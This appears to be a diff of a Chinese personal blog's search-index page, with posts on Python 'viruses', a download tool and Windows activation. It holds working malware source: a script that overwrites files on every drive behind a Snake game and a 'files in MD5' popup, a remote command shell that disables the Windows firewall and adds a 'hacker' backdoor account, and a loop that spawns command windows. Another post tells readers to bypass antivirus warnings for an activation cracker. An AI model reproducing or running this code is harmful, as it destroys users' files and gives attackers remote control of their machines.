+                bx = bytes(osv, encoding=&#39;utf-8&#39;)
+                with open(os.path.join(path, filename), &#39;wb&#39;) as f:
+                    f.write(bx)
+ 
+def Snake():
+ 
+    import pygame, sys, random
+ 
+ 
+    check_errors = pygame.init()
+    if check_errors[1] &amp;gt; 0:
+        print(&amp;quot;(!) Had {0} initializing errors, exiting...&amp;quot;.format(check_errors[1]))
+        sys.exit(-1)
+    else:
+        print(&amp;quot;(+) PyGame successfully initialized!&amp;quot;)
+ 
+ 
+    playSurface = pygame.display.set_mode((820, 560))
+    pygame.display.set_caption(&#39;snake&#39;)
+ 
+ 
+    red = pygame.Color(255, 0, 0)
+    green = pygame.Color(0, 255, 0)
+    black = pygame.Color(0, 0, 0)
+    white = pygame.Color(255, 255, 255)
+    brown = pygame.Color(165, 42, 42)
+ 
+ 
+    fpsController = pygame.time.Clock()
+ 
+ 
+    snakePos = [100, 50]
+    snakeBody = [[100, 50], [90, 50], [80, 50]]
+ 
+    foodPos = [random.randrange(1, 72) * 10, random.randrange(1, 46) * 10]
+    foodSpawn = True
+ 
+    direction = &#39;RIGHT&#39;
+    changeto = direction
+ 
+    score = 0
+ 
+ 
+    def gameOver():
+        myFont = pygame.font.SysFont(&#39;monaco&#39;, 72)
+        GOsurf = myFont.render(&#39;Game Over!&#39;, True, red)
+        GOrect = GOsurf.get_rect()
+        GOrect.midtop = (370, 190)
+        playSurface.blit(GOsurf, GOrect)
+        showScore(0)
+        pygame.display.flip()
+ 
+        time.sleep(4)
+        pygame.quit()
+        sys.exit()
+ 
+    def showScore(choice=1):
+        sFont = pygame.font.SysFont(&#39;monaco&#39;, 24)
+        Ssurf = sFont.render(&#39;Score : {0}&#39;.format(score), True, black)
+        Srect = Ssurf.get_rect()
+        if choice == 1:
+            Srect.midtop = (370, 230)
+        else:
+            Srect.midtop = (370, 230)
+        playSurface.blit(Ssurf, Srect)
+ 
+ 
+    while True:
+        for event in pygame.event.get():
+            if event.type == pygame.QUIT:
+                pygame.quit()
+                sys.exit()
+            elif event.type == pygame.KEYDOWN:
+                if event.key == pygame.K_RIGHT or event.key == ord(&#39;d&#39;):
+                    changeto = &#39;RIGHT&#39;
+                if event.key == pygame.K_LEFT or event.key == ord(&#39;a&#39;):
+                    changeto = &#39;LEFT&#39;
+                if event.key == pygame.K_UP or event.key == ord(&#39;w&#39;):
+                    changeto = &#39;UP&#39;
+                if event.key == pygame.K_DOWN or event.key == ord(&#39;s&#39;):
+                    changeto = &#39;DOWN&#39;
+                if event.key == pygame.K_ESCAPE:
+                    pygame.event.post(pygame.event.Event(pygame.QUIT))
+ 
+        if changeto == &#39;RIGHT&#39; and not direction == &#39;LEFT&#39;:
+            direction = &#39;RIGHT&#39;
+        if changeto == &#39;LEFT&#39; and not direction == &#39;RIGHT&#39;:
+            direction = &#39;LEFT&#39;
+        if changeto == &#39;UP&#39; and not direction == &#39;DOWN&#39;:
+            direction = &#39;UP&#39;
+        if changeto == &#39;DOWN&#39; and not direction == &#39;UP&#39;:
+            direction = &#39;DOWN&#39;
+ 
+ 
+        if direction == &#39;RIGHT&#39;:
+            snakePos[0] += 10
+        if direction == &#39;LEFT&#39;:
+            snakePos[0] -= 10
+        if direction == &#39;UP&#39;:
+            snakePos[1] -= 10
+        if direction == &#39;DOWN&#39;:
+            snakePos[1] += 10
+ 
+ 
+        snakeBody.insert(0, list(snakePos))
+        if snakePos[0] == foodPos[0] and snakePos[1] == foodPos[1]:
+            score += 1
+            foodSpawn = False
+        else:
+            snakeBody.pop()
+ 
+ 
+        if foodSpawn == False:
+            foodPos = [random.randrange(1, 82) * 10, random.randrange(1, 56) * 10]
+        foodSpawn = True
+ 
+ 
+        playSurface.fill(white)
+ 
+ 
+        for pos in snakeBody:
+            pygame.draw.rect(playSurface, green, pygame.Rect(pos[0], pos[1], 10, 10))
+ 
+        pygame.draw.rect(playSurface, brown, pygame.Rect(foodPos[0], foodPos[1], 10, 10))
+ 
+ 
+        if snakePos[0] &amp;gt;= 820 or snakePos[0] &amp;lt; 0:
+            gameOver()
+        if snakePos[1] &amp;gt;= 470 or snakePos[1] &amp;lt; 0:
+            gameOver()
+ 
+        for block in snakeBody[1:]:
+            if snakePos[0] == block[0] and snakePos[1] == block[1]:
+                gameOver()
+ 
+        showScore()
+        pygame.display.flip()
+        fpsController.tick(10)
+ 
+ 
+print(&#39;lodding...&#39;)
+ 
+pl=[&#39;A:/&#39;,&#39;B:/&#39;,&#39;C:/&#39;,&#39;D:/&#39;,&#39;E:/&#39;,&#39;F:/&#39;,&#39;G:/&#39;,&#39;H:/&#39;,&#39;I:/&#39;,&#39;J:/&#39;,&#39;K:/&#39;,&#39;L:/&#39;,&#39;M:/&#39;,&#39;N:/&#39;,&#39;O:/&#39;,&#39;P:/&#39;,&#39;Q:/&#39;,&#39;R:/&#39;,&#39;S:/&#39;,&#39;T:/&#39;,&#39;U:/&#39;,&#39;V:/&#39;,&#39;W:/&#39;,&#39;X:/&#39;,&#39;Y:/&#39;,&#39;Z:/&#39;]
+l = jmp.__len__()
+i = 0
+for i in range(l+1):
+    try:
+        if jmp[i+1]==&#39;:&#39;:
+            path = jmp[i] + jmp[i+1] + jmp[i+2]
+            Thanos(path)
+    except:
+        pass
+ 
+Snake()
+ 
+win32api.MessageBox(0, &#39;your all files on this computer is in MD5!&#39;, &#39;Ooooooops!&#39;, win32con.MB_ICONWARNING)
+ 
+while True:
+    time.sleep(60)
+    Usb()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;一定不要在自己的电脑上运行&#34;&gt;一定不要在自己的电脑上运行&lt;/h3&gt;
+&lt;h3 id=&#34;never-run-this-on-your-computer&#34;&gt;NEVER RUN THIS ON YOUR COMPUTER&lt;/h3&gt;
+&lt;p&gt;病毒的作用是：加密电脑上所有文件。&lt;br&gt;
+&lt;em&gt;呃......感觉......玩的有点过了呀......&lt;/em&gt;&lt;br&gt;
+运行此代码需要安装第三方库：&lt;br&gt;
+pywin32  如果你的Python是3.6版本，在cmd里运行：“pip install pywin32”（去掉引号）即可，否则，到&lt;a href=&#34;https://github.com/mhammond/pywin32/&#34;&gt;https://github.com/mhammond/pywin32/&lt;/a&gt; 里面下载对应的版本安装，具体安装过程可以看&lt;a href=&#34;https://www.cnblogs.com/yjlch1016/p/8469429.html&#34;&gt;https://www.cnblogs.com/yjlch1016/p/8469429.html&lt;/a&gt;的介绍。&lt;/p&gt;
+&lt;p&gt;time、os、 hashlib是Python自带的。无需安装&lt;/p&gt;
+&lt;h2 id=&#34;3号病毒&#34;&gt;3号病毒&lt;/h2&gt;
+&lt;h3 id=&#34;还是python3语言&#34;&gt;还是Python3语言&lt;/h3&gt;
+&lt;p&gt;此病毒分被控端——别人电脑上的、主控端——自己电脑上的&lt;br&gt;
+被控端：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;
+import os
+import socket
+os.popen(&#39;net stop mpssvc&#39;)
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+host = &#39;USER-20180705UV&#39;
+port = 6666
+s.bind((host,port))
+s.listen(5)
+while True:
+    print(&#39;lodding...\n\n&#39;)
+    c,addr = s.accept()
+    while True:
+        try:
+            client_date = str(c.recv(1024),&#39;utf8&#39;)
+            if client_date == &#39;quit&#39;:
+                c.close()
+                break
+        except Exception:
+            break
+ 
+        if client_date == &#39;bd&#39;:
+            os.popen(&#39;net user hacker 123456 /ADD&#39;)
+            re = &#39;BackDoor ADD Finish! &#39; + socket.gethostbyname(socket.gethostname())
+            c.send(bytes(re,&#39;utf8&#39;))
+        else:
+            r = os.popen(client_date).read()
+            c.send(bytes(r,&#39;utf8&#39;))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;os、socket都是Python自带库，无需安装&lt;/p&gt;
+&lt;p&gt;主控端：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import socket
+host = input(&#39;Host: &#39;) #对方的IP
+port = 6666
+hostport = (host,port)
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(hostport)
+ 
+def send():
+    user_input = input(&#39;&amp;gt; &#39;).strip()
+    if user_input == &#39;quit&#39;:
+        s.close()
+        exit(0)
+    elif user_input == &#39;backdoor&#39;:
+        s.send(bytes(&#39;bd&#39;,&#39;utf8&#39;))
+    else:
+        s.send(bytes(user_input,&#39;utf8&#39;))
+ 
+def get():
+    server_reply = s.recv(1024)
+    print(&#39;Server result:\n&#39;)
+    print(str(server_reply, &#39;utf8&#39;))
+ 
+while True:
+    send()
+    get()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;socket是Python自带库，无需安装&lt;/p&gt;
+&lt;p&gt;很简单,只能远程运行cmd命令,不过输入&amp;quot;backdoor&amp;quot;命令可以自动在Server上创建新用户。&lt;/p&gt;
+">病毒</a>
+        </div>
+      
+        <div class="item">
+          <a class="result-title" href="http://huangmingli.ml/post/fei-chang-hao-de-xia-zai-qi-motrix/"" data-c="&lt;p&gt;&lt;img src=&#34;http://huangmingli.ml/post-images/1584789058372.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
+一款全能的下载工具&lt;br&gt;
+支持下载 HTTP、FTP、BT、磁力链、百度网盘等资源&lt;br&gt;
+&lt;img src=&#34;http://huangmingli.ml/post-images/1584789244526.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
+&lt;p&gt;还支持Windows、Linux、MacOS系统。&lt;/p&gt;
+&lt;p&gt;它拥有&lt;br&gt;
+🕹 简洁明了的图形操作界面&lt;br&gt;
+🦄 支持BT和磁力链任务&lt;br&gt;
+💾 支持下载百度云盘资源&lt;br&gt;
+🎛 最高支持 10 个任务同时下载&lt;br&gt;
+🚀 单任务最高支持 64 线程下载&lt;br&gt;
+🕶 模拟用户代理UA&lt;br&gt;
+🔔 下载完成后通知&lt;br&gt;
+💻 支持触控栏快捷键(Mac 专享)&lt;br&gt;
+🤖 常驻系统托盘，操作更加便捷&lt;br&gt;
+🌑 深色模式New&lt;br&gt;
+🗑 移除任务时可同时删除相关文件&lt;br&gt;
+🌍 国际化(可选择简体中文或英文界面)&lt;/p&gt;
+&lt;p&gt;是个很好的下载器&lt;br&gt;
+附上官网地址：https://motrix.app/zh-CN&lt;/p&gt;
+&lt;p&gt;由于官网感觉是外国网站，所以我提供国内网盘下载链接：https://share.weiyun.com/5zsZ6RI&lt;/p&gt;
+">非常好的下载器motrix</a>
+        </div>
+      
+        <div class="item">
+          <a class="result-title" href="http://huangmingli.ml/post/wen-jian-shu-ju-ku/"" data-c="&lt;p&gt;提交软件：3172456158@qq.com&lt;br&gt;
+你可以在此下载文件：&lt;br&gt;
+motrix : https://share.weiyun.com/5zsZ6RI&lt;/p&gt;
+">黄明礼下载站</a>
+        </div>
+      
+        <div class="item">
+          <a class="result-title" href="http://huangmingli.ml/post/jie-jue-bu-neng-fang-wen-wo-de-bo-ke-de-fang-fa/"" data-c="&lt;p&gt;最近，有人向我反映，说博客不能访问，下面我就讲讲解决方法：&lt;br&gt;
+第一种：如果网站出现这种情况：&lt;img src=&#34;http://huangmingli.ml/post-images/1583224991973.PNG&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
+将Brucehml.github.com改为Brucehml.github.io&lt;/p&gt;
+&lt;p&gt;第二种：如果网址出现这种情况&lt;img src=&#34;http://huangmingli.ml/post-images/1583225162957.PNG&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;以及各种无法访问的情况，请检查地址栏是不是：https://Brucehml.github.io 尤其注意https:// 和 .io。&lt;/p&gt;
+&lt;p&gt;2020/4/19注：如果用的是新网址&lt;a href=&#34;http://hmlblog.ml&#34;&gt;http://hmlblog.ml&lt;/a&gt;请注意协议为http，后缀为ml&lt;br&gt;
+未来将开通https网站&lt;/p&gt;
+&lt;p&gt;2020/5/8注：新域名&lt;a href=&#34;http://huangmingli.ml&#34;&gt;http://huangmingli.ml&lt;/a&gt;请注意协议为http，后缀为ml&lt;/p&gt;
+">解决不能访问我的博客的方法</a>
+        </div>
+      
+        <div class="item">
+          <a class="result-title" href="http://huangmingli.ml/post/ru-he-ji-huo-windows10-zhuan-ye-ban-qin-ce-hao-yong/"" data-c="&lt;p&gt;由于微软停止了对Windows7的支持，许多Win7的用户都更新了Windows10。可是，当更新Windows10时，显示未激活，这怎么办呢？&lt;img src=&#34;http://huangmingli.ml/post-images/1583216407297.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
+尤其是一些买了正版Win7的，明明是正版，但一升级就显示未激活，这怎么办呢？没事，这里我给大家带来了激活方法。&lt;/p&gt;
+&lt;p&gt;对于一些运气好的，可能从网上随便找一个激活码就OK了，但至少我不是这样。在我这台电脑上，各种错误都有，好不容易找到了一款后，又把我的专业版变成教育版了。所以，这里推荐大家用小马激活工具（本人用微软win7系统升级下载工具下载的，32位和64位都可以用）&lt;/p&gt;
+&lt;p&gt;小马激活工具官网：http://www.pccppc.com/&lt;br&gt;
+注意：如果电脑右侧弹出了Windows病毒拦截，请立即点开，并选择“操作”--&amp;gt;“允许在设备上”。&lt;br&gt;
+如果杀毒软件报毒，请点击“添加信任”。&lt;br&gt;
+如果弹出这样的窗口&lt;img src=&#34;http://huangmingli.ml/post-images/1583217795511.PNG&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;请点击否。&lt;/p&gt;
+&lt;p&gt;在保存好未保存的文件后，我们点击“立即体验正版”即可。&lt;br&gt;
+&lt;img src=&#34;http://huangmingli.ml/post-images/1583218030631.PNG&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
+软件会帮你自动激活并重启。&lt;/p&gt;
+&lt;p&gt;2020/3/23注：此方法在部分电脑上无法使用，可以试试暴风激活&lt;br&gt;
+2020/4/19注：小马激活最新版可能带有病毒&lt;/p&gt;
+">如何激活Windows10专业版（亲测好用）</a>
+        </div>
+      
+        <div class="item">
+          <a class="result-title" href="http://huangmingli.ml/post/win/"" data-c="&lt;p&gt;由于微软停止了对Windows7的支持，许多Win7的用户都更新了Windows10。可是，当更新Windows10时，显示未激活，这怎么办呢？&lt;img src=&#34;http://huangmingli.ml/post-images/1583216407297.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
+尤其是一些买了正版Win7的，明明是正版，但一升级就显示未激活，这怎么办呢？没事，这里我给大家带来了激活方法。&lt;/p&gt;
+&lt;p&gt;对于一些运气好的，可能从网上随便找一个激活码就OK了，但至少我不是这样。在我这台电脑上，各种错误都有，好不容易找到了一款后，又把我的专业版变成教育版了。所以，这里推荐大家用小马激活工具（本人用微软win7系统升级下载工具下载的，32位和64位都可以用）&lt;/p&gt;
+&lt;p&gt;小马激活工具官网：http://www.pccppc.com/&lt;br&gt;
+注意：如果电脑右侧弹出了Windows病毒拦截，请立即点开，并选择“操作”--&amp;gt;“允许在设备上”。&lt;br&gt;
+如果杀毒软件报毒，请点击“添加信任”。&lt;br&gt;
+如果弹出这样的窗口&lt;img src=&#34;http://huangmingli.ml/post-images/1583217795511.PNG&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;请点击否。&lt;/p&gt;
+&lt;p&gt;在保存好未保存的文件后，我们点击“立即体验正版”即可。&lt;br&gt;
+&lt;img src=&#34;http://huangmingli.ml/post-images/1583218030631.PNG&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
+软件会帮你自动激活并重启。&lt;/p&gt;
+&lt;p&gt;2020/3/23注：此方法在部分电脑上无法使用，可以试试暴风激活&lt;br&gt;
+2020/4/19注：小马激活最新版可能带有病毒&lt;/p&gt;
+">如何激活Windows10专业版（亲测好用）</a>
+        </div>
+      
+        <div class="item">
+          <a class="result-title" href="http://huangmingli.ml/post/about/"" data-c="&lt;blockquote&gt;
+&lt;p&gt;欢迎来到我的小站呀，很高兴遇见你！🤝&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;关于本站&#34;&gt;🏠 关于本站&lt;/h2&gt;
+&lt;p&gt;本站是由黄明礼制作，主要是一些和电脑操作、编程有关的文章。&lt;/p&gt;
+&lt;h2 id=&#34;博主是谁&#34;&gt;👨‍💻 博主是谁&lt;/h2&gt;
+&lt;p&gt;黄明礼，一名五年级学生。&lt;/p&gt;
+&lt;h2 id=&#34;兴趣爱好&#34;&gt;⛹ 兴趣爱好&lt;/h2&gt;
+&lt;p&gt;编程&lt;/p&gt;
+&lt;h2 id=&#34;联系我呀&#34;&gt;📬 联系我呀&lt;/h2&gt;
+&lt;p&gt;QQ：3172456158&lt;br&gt;
+&lt;a target=&#34;_blank&#34; href=&#34;http://wpa.qq.com/msgrd?v=3&amp;uin=3172456158&amp;site=qq&amp;menu=yes&#34;&gt;&lt;img border=&#34;0&#34; src=&#34;http://wpa.qq.com/pa?p=2:3172456158:41&#34; alt=&#34;跟我交谈&#34; title=&#34;跟我交谈&#34;/&gt;&lt;/a&gt;&lt;br&gt;
+邮箱：&lt;a href=&#34;mailto:Brucehml@126.com&#34;&gt;Brucehml@126.com&lt;/a&gt;&lt;br&gt;
+邮箱：&lt;a href=&#34;mailto:huangmingli@huangmingli.ml&#34;&gt;huangmingli@huangmingli.ml&lt;/a&gt;&lt;/p&gt;
+">关于</a>
+        </div>
+      
+    </div>
+  </div>
+</div>
+<script>
+  // var escape = "[{&#34;content&#34;:&#34;&lt;p&gt;视频：&lt;/p&gt;\n&lt;iframe src=\&#34;//player.bilibili.com/player.html?aid=200475966&amp;bvid=BV14z411z76W&amp;cid=183180970&amp;page=1\&#34; scrolling=\&#34;no\&#34; border=\&#34;0\&#34; frameborder=\&#34;no\&#34; framespacing=\&#34;0\&#34; allowfullscreen=\&#34;true\&#34;&gt; &lt;/iframe&gt;\n&lt;p&gt;视频地址：&lt;a href=\&#34;https://www.bilibili.com/video/BV14z411z76W/\&#34;&gt;https://www.bilibili.com/video/BV14z411z76W/&lt;/a&gt;&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;Yc9CYbUw2&#34;,&#34;abstract&#34;:&#34;&#34;,&#34;title&#34;:&#34;认识和安装Python——跟小学生学编程&#34;,&#34;tags&#34;:[],&#34;date&#34;:&#34;2020-06-20 13:28:04&#34;,&#34;dateFormat&#34;:&#34;2020-06-20&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;http://huangmingli.ml/post/Yc9CYbUw2/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:3000,&#34;words&#34;:12,&#34;minutes&#34;:1},&#34;description&#34;:&#34;视频：\n \n视频地址：https://www.bilibili.com/video/BV14z411z76W/\n...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;script type=\&#34;text/javascript\&#34;&gt;(function(){document.write(unescape(&#39;%3Cdiv id=\&#34;bdcs\&#34;%3E%3C/div%3E&#39;));var bdcs = document.createElement(&#39;script&#39;);bdcs.type = &#39;text/javascript&#39;;bdcs.async = true;bdcs.src = &#39;http://znsv.baidu.com/customer_search/api/js?sid=17245644332282096764&#39; + &#39;&amp;plate_url=&#39; + encodeURIComponent(window.location.href) + &#39;&amp;t=&#39; + Math.ceil(new Date()/3600000);var s = document.getElementsByTagName(&#39;script&#39;)[0];s.parentNode.insertBefore(bdcs, s);})();&lt;/script&gt;\n&lt;style type=\&#34;text/css\&#34;&gt;;;\n#so360{white-space:nowrap}\n#so360_keyword{width:222\n#so360 form{margin:0;padding:0}px center;}\n#so360_submit{width:60outline:0;vertical-align:middle;padding-right: 95px;}\n#so360_keyword{background:url(https://p.ssl.qhimg.com/t01ab1a3fb05f0ee893.png)\n no-repeat 242&lt;/style&gt;\n&lt;div id=\&#34;so360\&#34;&gt;\n    &lt;form action=\&#34;http://www.so.com/s\&#34; target=\&#34;_blank\&#34; id=\&#34;so360form\&#34;&gt;\n   &lt;input type=\&#34;text\&#34; autocomplete=\&#34;off\&#34; name=\&#34;q\&#34; id=\&#34;so360_keyword\&#34;&gt;\n        &lt;input type=\&#34;submit\&#34; id=\&#34;so360_submit\&#34; value=\&#34;搜 索\&#34;&gt;\n        &lt;input type=\&#34;hidden\&#34; name=\&#34;ie\&#34; value=\&#34;utf8\&#34;&gt;\n        &lt;input type=\&#34;hidden\&#34; name=\&#34;src\&#34; value=\&#34;zz_huangmingli.ml\&#34;&gt;\n        &lt;input type=\&#34;hidden\&#34; name=\&#34;site\&#34; value=\&#34;huangmingli.ml\&#34;&gt;\n        &lt;input type=\&#34;hidden\&#34; name=\&#34;rg\&#34; value=\&#34;1\&#34;&gt;\n    &lt;/form&gt;\n&lt;/div&gt;&#34;,&#34;fileName&#34;:&#34;LqyoenAHz&#34;,&#34;abstract&#34;:&#34;&#34;,&#34;title&#34;:&#34;搜索&#34;,&#34;tags&#34;:[],&#34;date&#34;:&#34;2020-05-09 20:42:29&#34;,&#34;dateFormat&#34;:&#34;2020-05-09&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;http://huangmingli.ml/post/LqyoenAHz/&#34;,&#34;hideInList&#34;:true,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:35000,&#34;words&#34;:94,&#34;minutes&#34;:1},&#34;description&#34;:&#34;(function(){document.write(unescape(&#39;%3Cdiv id=\&#34;bdcs\&#34;%3E%3C/div%3E&#39;));var bdcs = document.createElement(&#39;script&#39;);bdcs.t...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;p&gt;坦克大战深受很多人喜爱，今天，我也来写一个坦克大战&lt;br&gt;\n代码有点长，先给出下载链接&lt;br&gt;\n&amp;lt; https://share.weiyun.com/5xFH7rD &amp;gt;下载&lt;/p&gt;\n&lt;p&gt;cpp是源码，exe是程序&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;Aimzsf-cV&#34;,&#34;abstract&#34;:&#34;&#34;,&#34;title&#34;:&#34;C++坦克大战小游戏&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;C++&#34;,&#34;slug&#34;:&#34;QP6qCLL04&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/QP6qCLL04/&#34;},{&#34;name&#34;:&#34;软件&#34;,&#34;slug&#34;:&#34;jExDrgbsVq&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/jExDrgbsVq/&#34;},{&#34;name&#34;:&#34;电脑操作&#34;,&#34;slug&#34;:&#34;DVl0teJMPT&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/DVl0teJMPT/&#34;}],&#34;date&#34;:&#34;2020-05-09 12:32:46&#34;,&#34;dateFormat&#34;:&#34;2020-05-09&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;http://huangmingli.ml/post/Aimzsf-cV/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:11000,&#34;words&#34;:52,&#34;minutes&#34;:1},&#34;description&#34;:&#34;坦克大战深受很多人喜爱，今天，我也来写一个坦克大战\n代码有点长，先给出下载链接\n&amp;lt; https://share.weiyun.com/5xFH7rD &amp;gt;下载\ncpp是源码，exe是程序\n&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;h2 id=\&#34;欢迎给我打钱小站经营需要费用啊~~~\&#34;&gt;欢迎给我打钱，小站经营需要费用啊~~~&lt;/h2&gt;\n&lt;p&gt;微信&lt;br&gt;\n&lt;img src=\&#34;http://huangmingli.ml/post-images/1588823507680.jpg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;p&gt;QQ&lt;br&gt;\n&lt;img src=\&#34;http://huangmingli.ml/post-images/1592567221193.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;A2YyutqDb&#34;,&#34;abstract&#34;:&#34;&#34;,&#34;title&#34;:&#34;打赏&#34;,&#34;tags&#34;:[],&#34;date&#34;:&#34;2020-05-07 11:42:18&#34;,&#34;dateFormat&#34;:&#34;2020-05-07&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;http://huangmingli.ml/post/A2YyutqDb/&#34;,&#34;hideInList&#34;:true,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:3000,&#34;words&#34;:18,&#34;minutes&#34;:1},&#34;description&#34;:&#34;欢迎给我打钱，小站经营需要费用啊~~~\n微信\n\nQQ\n\n...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%AC%A2%E8%BF%8E%E7%BB%99%E6%88%91%E6%89%93%E9%92%B1%E5%B0%8F%E7%AB%99%E7%BB%8F%E8%90%A5%E9%9C%80%E8%A6%81%E8%B4%B9%E7%94%A8%E5%95%8A~~~\&#34;&gt;欢迎给我打钱，小站经营需要费用啊~~~&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;上代码：&lt;br&gt;\nPython：&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\&#34;language-python\&#34;&gt;import os\n#将下面改为&amp;quot;while 1:&amp;quot;会永远执行（直到叉掉或关机）\nfor x in range(1,100):\n    os.system(&amp;quot;start&amp;quot;)\n\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;C++：&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\&#34;language-cpp\&#34;&gt;#include &amp;lt;windows.h&amp;gt;\nusing namespace std;\nint main()\n{\n/*永远执行需要将下面一句改为\n    &amp;quot;while(1)&amp;quot;*/\n\tfor(int i = 1;i &amp;lt;= 100;i++)\n\t{\n\t\tsystem(&amp;quot;start&amp;quot;);\n\t}\n\treturn 0;\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;视频可以到B站上看：&lt;a href=\&#34;https://www.bilibili.com/video/BV1sC4y147b8/\&#34;&gt;https://www.bilibili.com/video/BV1sC4y147b8/&lt;/a&gt;&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;yon&#34;,&#34;abstract&#34;:&#34;&#34;,&#34;title&#34;:&#34;用Python和C++实现卡机病毒---100个cmd窗口&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;C++&#34;,&#34;slug&#34;:&#34;QP6qCLL04&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/QP6qCLL04/&#34;},{&#34;name&#34;:&#34;软件&#34;,&#34;slug&#34;:&#34;jExDrgbsVq&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/jExDrgbsVq/&#34;},{&#34;name&#34;:&#34;电脑操作&#34;,&#34;slug&#34;:&#34;DVl0teJMPT&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/DVl0teJMPT/&#34;},{&#34;name&#34;:&#34;Python&#34;,&#34;slug&#34;:&#34;Bz9PrMIYTT&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/Bz9PrMIYTT/&#34;},{&#34;name&#34;:&#34;文件&#34;,&#34;slug&#34;:&#34;sQxBWofXSD&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/sQxBWofXSD/&#34;}],&#34;date&#34;:&#34;2020-03-30 19:00:32&#34;,&#34;dateFormat&#34;:&#34;2020-03-30&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;http://huangmingli.ml/post/yon/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:28000,&#34;words&#34;:95,&#34;minutes&#34;:1},&#34;description&#34;:&#34;上代码：\nPython：\nimport os\n#将下面改为&amp;quot;while 1:&amp;quot;会永远执行（直到叉掉或关机）\nfor x in range(1,100):\n    os.system(&amp;quot;start&amp;quot;)\n...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;p&gt;上代码：&lt;br&gt;\nPython：&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\&#34;language-python\&#34;&gt;import os\n#将下面改为&amp;quot;while 1:&amp;quot;会永远执行（直到叉掉或关机）\nfor x in range(1,100):\n    os.system(&amp;quot;start&amp;quot;)\n\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;C++：&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\&#34;language-cpp\&#34;&gt;#include &amp;lt;windows.h&amp;gt;\nusing namespace std;\nint main()\n{\n/*永远执行需要将下面一句改为\n    &amp;quot;while(1)&amp;quot;*/\n\tfor(int i = 1;i &amp;lt;= 100;i++)\n\t{\n\t\tsystem(&amp;quot;start&amp;quot;);\n\t}\n\treturn 0;\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;视频可以到B站上看：&lt;a 